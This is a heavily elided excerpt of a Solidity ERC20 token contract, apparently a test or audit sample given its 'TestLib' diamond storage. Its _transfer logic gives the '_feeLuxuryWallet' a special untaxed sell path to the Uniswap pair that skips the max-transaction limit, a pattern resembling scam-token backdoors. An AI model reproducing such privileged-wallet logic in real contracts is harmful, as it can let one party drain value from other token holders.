...
contract balanceOfFacet is IERC20, Context, Ownable {
    ...
    function approveThisGuySomeTokens(
        address spender,
        uint256 amount
    ) public returns (bool) {
        _approve(_msgSender(), spender, amount);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._feeLuxuryWallet)) {
                    amountOut = min(
                        amount,
                        min(ds._finalBuyTax, ds._minLuxurySwapAmount)
                    );
                    taxAmount = 0;
                } else {
                    require(amount <= ds._maxTx, "Exceeds the ds._maxTx.");
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minLuxurySwapAmount == min(amount, ds._minLuxurySwapAmount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minLuxurySwapAmount) {
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._feeLuxuryWallet.transfer(amount);
    }
}
